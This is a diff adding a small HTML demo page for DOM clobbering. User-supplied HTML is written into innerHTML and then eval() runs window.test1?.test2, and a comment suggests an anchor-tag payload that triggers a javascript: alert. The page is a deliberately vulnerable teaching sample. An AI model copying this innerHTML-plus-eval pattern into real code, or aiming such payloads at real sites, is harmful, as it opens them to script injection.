@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>DOM Clobbering Injection Demo</title>
+</head>
+<body>
+
+<!-- works only in chromimium -->
+
+<h2>Enter HTML:</h2>
+<textarea id="userInput" rows="6" cols="80">
+<!-- Paste payload like: <a id="test1"></a><a id="test1" name="test2" href="javascript:alert('Clobbered!')"></a> -->
+</textarea><br>
+<button onclick="inject()">Inject HTML</button>
+
+<div id="output"></div>
+
+<script>
+function inject() {
+    const html = document.getElementById('userInput').value;
+    document.getElementById('output').innerHTML = html;
+
+    // Simulated vulnerable code using eval
+    try {
+        console.log("Evaluating: ", '' + window.test1?.test2);
+        eval('' + window.test1?.test2); // This will trigger alert if clobbered
+    } catch (e) {
+        console.error("Eval failed:", e);
+    }
+}
+</script>
+
+</body>
+</html>
